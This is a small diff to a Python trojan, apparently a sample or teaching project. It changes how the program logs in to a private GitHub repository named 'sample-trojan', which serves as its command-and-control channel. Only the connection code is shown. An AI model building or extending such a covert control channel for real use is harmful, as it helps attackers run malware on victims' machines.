@@ -13,7 +13,11 @@ def github_connect(): # to connect to the account and priv repo
     with open('token.txt') as f:
         token = f.read()
     user = "jankat12"
-    sess = github3.login(token=token) 
+    #sess = github3.login(token=token)
+    sess = github3.GitHub(session=github3.session.GitHubSession(
+    default_connect_timeout=4, default_read_timeout=60), token=token)
+
+    
     return sess.repository(user, 'sample-trojan')
 
 def get_file_contents(dirname, module_name, repo):
